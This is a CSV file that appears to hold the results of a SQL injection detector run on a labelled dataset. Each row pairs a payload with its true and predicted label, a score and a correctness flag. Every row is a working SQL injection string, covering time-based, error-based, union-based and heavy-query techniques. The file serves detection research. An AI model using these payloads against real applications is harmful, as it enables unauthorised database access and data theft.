text,source,true_label,pred_label,score_sqli,correct
"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,1.3969021758097235,1
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",sajid576/sql-injection-dataset,1,1,2.4338276509780576,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",sajid576/sql-injection-dataset,1,1,1.8987683835928868,1
end and    (    (   'zeyr'  =  'zeyr,sajid576/sql-injection-dataset,1,1,0.966201412190732,1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,1.8911759746361314,1
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,sajid576/sql-injection-dataset,1,1,1.1418968125685374,1
1'+  (  select dklj where 3265  =  3265,sajid576/sql-injection-dataset,1,1,1.1443588898805404,1
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",sajid576/sql-injection-dataset,1,1,2.6940080969867894,1
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",sajid576/sql-injection-dataset,1,1,1.3277418860340466,1
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,3.0730440438788538,1
-4595'  )   where 4892  =  4892 order by 1--,sajid576/sql-injection-dataset,1,1,1.638384303085202,1
"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",sajid576/sql-injection-dataset,1,1,3.0280883191196586,1
1'   )    )    as xirr where 2425  =  2425,sajid576/sql-injection-dataset,1,1,1.7079033205638678,1
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )",sajid576/sql-injection-dataset,1,1,1.1454363686960445,1
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",sajid576/sql-injection-dataset,1,1,3.0507299578476124,1
select case when 7717  =  7717 then 1 else null end--,sajid576/sql-injection-dataset,1,1,0.946979559400626,1
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1,1,2.04722099260709,1
1'||  (  select 'sxya' where 3578  =  3578,sajid576/sql-injection-dataset,1,1,1.7671240745979535,1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ),sajid576/sql-injection-dataset,1,1,1.3264478717456814,1
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1,1,1.8874256280309663,1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",sajid576/sql-injection-dataset,1,1,1.9084128164964689,1
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,1,1,2.196185399924402,1
"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",sajid576/sql-injection-dataset,1,1,1.7152016625558546,1
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sajid576/sql-injection-dataset,1,1,1.6969805220934293,1
"1'+  (  select 'myrb' where 3622  =  3622 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",sajid576/sql-injection-dataset,1,1,1.4344806174084272,1
"-4915' union all select 1928,1928,1928,1928#",sajid576/sql-injection-dataset,1,1,1.556460198695583,1
"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sajid576/sql-injection-dataset,1,1,1.6932363780926698,1
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,1,1,1.6668029216946136,1
"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",sajid576/sql-injection-dataset,1,1,2.059355787167681,1
"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,1.7977933110197624,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   3508  =  3508",sajid576/sql-injection-dataset,1,1,1.2101615312286649,1
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,2.1007694388913354,1
"1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,1,1,2.3064115579392555,1
"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",sajid576/sql-injection-dataset,1,1,1.97959634582255,1
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd",sajid576/sql-injection-dataset,1,1,1.7907427260718274,1
"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",sajid576/sql-injection-dataset,1,1,2.227350973691917,1
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",sajid576/sql-injection-dataset,1,1,1.1138883617352775,1
1'  )   where 4509  =  4509 union all select null--,sajid576/sql-injection-dataset,1,1,3.3897634563984536,1
"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",sajid576/sql-injection-dataset,1,1,2.14572906634151,1
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""xjdh""  =  ""xjdh",sajid576/sql-injection-dataset,1,1,1.882716490746152,1
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""isbh"" like ""isbh",sajid576/sql-injection-dataset,1,1,2.0401900813131455,1
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,1.5874624907514296,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ckpm'  =  'ckpm",sajid576/sql-injection-dataset,1,1,1.395965120335009,1
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",sajid576/sql-injection-dataset,1,1,2.449696639533476,1
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,sajid576/sql-injection-dataset,1,1,2.6950532687990076,1
1'||  (  select 'tjzy' where 3037  =  3037,sajid576/sql-injection-dataset,1,1,1.7979705922086309,1
1'  )   as fyib where 9246  =  9246,sajid576/sql-injection-dataset,1,1,0.9080394847768477,1
1 and 2620  =  2175,sajid576/sql-injection-dataset,1,1,0.8603127351209067,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,1,1,2.6281484210576136,1
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",sajid576/sql-injection-dataset,1,1,2.0262805604378684,1
"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,2.565526930646063,1
1'  )   where 3311  =  3311,sajid576/sql-injection-dataset,1,1,1.4155394445119134,1
"1""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,1,1,1.2014361302575023,1
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""pyfz"" like ""pyfz",sajid576/sql-injection-dataset,1,1,1.8070165881222557,1
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",sajid576/sql-injection-dataset,1,1,0.4680668602413559,1
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",sajid576/sql-injection-dataset,1,1,2.6340015975346125,1
1'+  (  select mhfn where 2425  =  2425,sajid576/sql-injection-dataset,1,1,1.4851474240208011,1
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",sajid576/sql-injection-dataset,1,1,1.5700453680557853,1
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,sajid576/sql-injection-dataset,1,1,1.530801609536776,1
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",sajid576/sql-injection-dataset,1,1,1.9337853915993812,1
"-3518  )   union all select 1877,1877,1877,1877#",sajid576/sql-injection-dataset,1,1,2.26025505177733,1
"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",sajid576/sql-injection-dataset,1,1,1.4013019119497137,1
"-4580"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dbhb""  =  ""dbhb",sajid576/sql-injection-dataset,1,1,1.286236948341367,1
"1""  )   and 8677  =  9054#",sajid576/sql-injection-dataset,1,1,0.7843353424766052,1
"1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,2.4587035843144727,1
"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",sajid576/sql-injection-dataset,1,1,2.2610651087618545,1
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sajid576/sql-injection-dataset,1,1,2.0654304548693925,1
"1""  )   where 1144  =  1144 and 2006  =  2006",sajid576/sql-injection-dataset,1,1,1.609636004208165,1
1 where 7038  =  7038,sajid576/sql-injection-dataset,1,1,1.2314473528887038,1
"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,1,1,1.9889802861296482,1
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",sajid576/sql-injection-dataset,1,1,2.04423036449931,1
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,1,1,1.6931803754899821,1
"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",sajid576/sql-injection-dataset,1,1,1.7686271342314548,1
"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1,1,1.8133616413223974,1
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx",sajid576/sql-injection-dataset,1,1,1.3260047289710037,1
"-9672%""   )    )     )   order by 1#",sajid576/sql-injection-dataset,1,1,1.783844551796229,1
"-2717"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,1,1,1.965101988734748,1
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",sajid576/sql-injection-dataset,1,1,0.9086269222000972,1
"-7306"" or 2081  =  6847",sajid576/sql-injection-dataset,1,1,0.8162380110916515,1
1 and   (  1977  =  6852  )  *6852-- clxl,sajid576/sql-injection-dataset,1,1,0.7084067704448126,1
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",sajid576/sql-injection-dataset,1,1,0.7383125869514303,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",sajid576/sql-injection-dataset,1,1,1.1980870277466416,1
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",sajid576/sql-injection-dataset,1,1,1.713071222225241,1
"-9382'  )   union all select 4774,4774,4774,4774--",sajid576/sql-injection-dataset,1,1,2.5016414884665235,1
-3752%' union all select 9351--,sajid576/sql-injection-dataset,1,1,3.931048527149577,1
-2372' or 1783  =  2656,sajid576/sql-injection-dataset,1,1,0.7643220085636172,1
"1'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,2.1709575305062803,1
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,2.267054910502795,1
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj",sajid576/sql-injection-dataset,1,1,3.056847595005248,1
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",sajid576/sql-injection-dataset,1,1,1.2757039990240129,1
1'  )   and 2305  =  1934,sajid576/sql-injection-dataset,1,1,1.0428179616100341,1
"1' in boolean mode  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",sajid576/sql-injection-dataset,1,1,1.7049765696056047,1
"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sajid576/sql-injection-dataset,1,1,1.942235303494992,1
"1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,1.9833411533512182,1
"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,1.862920423911906,1
